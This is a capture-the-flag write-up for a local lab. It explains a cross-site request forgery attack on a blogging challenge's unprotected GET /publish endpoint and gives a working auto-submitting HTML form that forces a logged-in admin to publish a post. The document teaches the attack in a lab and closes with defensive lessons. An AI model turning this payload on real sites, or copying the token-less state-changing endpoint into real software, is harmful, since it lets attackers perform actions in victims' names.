## 🛡️ Challenge: CSRF Exploitation (challenge.localhost)

### 🔍 Description

The web challenge simulates a blogging platform (`challenge.localhost`) where users can write and publish posts. Only authenticated users can perform sensitive actions like publishing posts. The goal is to **trick the admin (who is logged in)** into publishing their own draft post, which contains the **flag**.

The challenge enforces:

* **Same-Origin Policy (SOP)**: preventing JavaScript from reading or modifying content from other domains.
* A `/publish` endpoint that only works **if the user is logged in**, and the session is stored in cookies.

### 🎯 Objective

Trigger the `/publish` endpoint while the admin is authenticated — **without access to their credentials or session tokens**.

---

## 🧠 Exploit Strategy

This is a **classic CSRF attack**:

> Cross-Site Request Forgery (CSRF) abuses the fact that browsers send cookies automatically with cross-site requests. If a logged-in user visits a malicious site, that site can perform actions **on their behalf** via forged HTTP requests.

Since SOP prevents us from reading the response or stealing the flag directly, our goal is simply to **make the admin publish their draft**. Once published, the flag becomes visible to everyone.

---

## 🧪 Vulnerable Endpoint

```python
@app.route("/publish", methods=["GET"])
def challenge_publish():
    if "username" not in flask.session:
        flask.abort(403, "Log in first!")

    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [flask.session.get("username")])
    return flask.redirect("/")
```

* Method: **GET** ✅
* Requires: **authenticated session**
* No CSRF token ✅
* Perfect for exploitation

---

## 🧬 Exploit Setup

### 1. Create a malicious CSRF page on `hacker.localhost:1337`

Save this as `index.html` in your working directory:

```html
<!DOCTYPE html>
<html>
  <body>
    <form id="csrfForm" action="http://challenge.localhost/publish" method="GET">
    </form>
    <script>
      document.getElementById("csrfForm").submit();
    </script>
  </body>
</html>
```

### 2. Serve the file:

```bash
python3 -m http.server 1337
```

Now `http://hacker.localhost:1337/` serves the CSRF payload.

---

## 🧨 Attack Flow

1. Admin is logged in at `http://challenge.localhost`
2. Admin is tricked into visiting `http://hacker.localhost:1337` (either manually or via an image link, post, etc.)
3. `index.html` auto-submits the form to `/publish`
4. The request includes admin’s session cookies (CSRF in action)
5. Admin’s draft is published
6. Visiting `http://challenge.localhost` now reveals the flag

---

## ✅ Result

After the admin visits the malicious page:

```html
<h2>Author: admin</h2>
pwn.college{************}
```

Flag published! 🎉

---

## 🧠 Lessons Learned

* CSRF is **very powerful** when session cookies are used without CSRF protection.
* SOP stops malicious scripts from reading responses — but not from **sending requests**.
* Naming matters — `http.server` looks for `index.html` by default.
* Use **CSRF tokens** and **non-GET methods** for sensitive actions in real applications.
